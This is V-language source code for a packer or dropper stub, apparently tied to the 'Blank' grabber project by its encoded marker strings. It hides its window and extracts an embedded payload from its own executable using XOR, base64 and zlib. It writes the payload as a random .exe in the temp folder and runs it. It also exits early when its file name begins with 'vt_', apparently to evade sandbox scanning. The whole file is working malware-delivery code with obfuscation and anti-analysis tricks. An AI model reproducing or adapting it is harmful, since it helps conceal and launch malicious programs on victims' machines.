module main

import os
import rand
import encoding.base64
import compress.zlib

#flag -mwindows

const secretkey = "Qmxhbms="
const beginflag = "Z2l0aHViLmNvbS9CbGFuay1j"
const endflag = "QkxhTmtJc1RoRWJFc1Q="

fn xorcrypt(data []u8) []u8 {
	key := base64.decode_str(secretkey)
	mut newdata := []u8{}
	for i, val in data{
		newdata << val ^ u8(key[i % key.len])
	}
	return newdata
}

fn decompress() ![]u8{
	basedata := os.read_file(os.executable())!
	secretkeyo := base64.decode_str(beginflag)
	secretkeye := base64.decode_str(endflag)
	mut data := []u8{}

	if !(basedata.contains(secretkeyo)) || !(basedata.contains(secretkeye)){
		exit(1)
	}
	data = xorcrypt(basedata.find_between(secretkeyo, secretkeye).bytes())
	data = base64.decode(data.bytestr())
	data = zlib.decompress(data)!
	return data
}

fn main() {
	if os.base(os.executable()).starts_with("vt_"){
		exit(0)
	}

	mut fp := os.join_path(os.temp_dir(), "${rand.hex(5)}.exe")
	data := decompress()!

	mut file := os.create(fp) or {exit(1)}
	file.write(data) or {exit(1)}
	file.close()
	os.execvp(fp, os.args[1..])!
}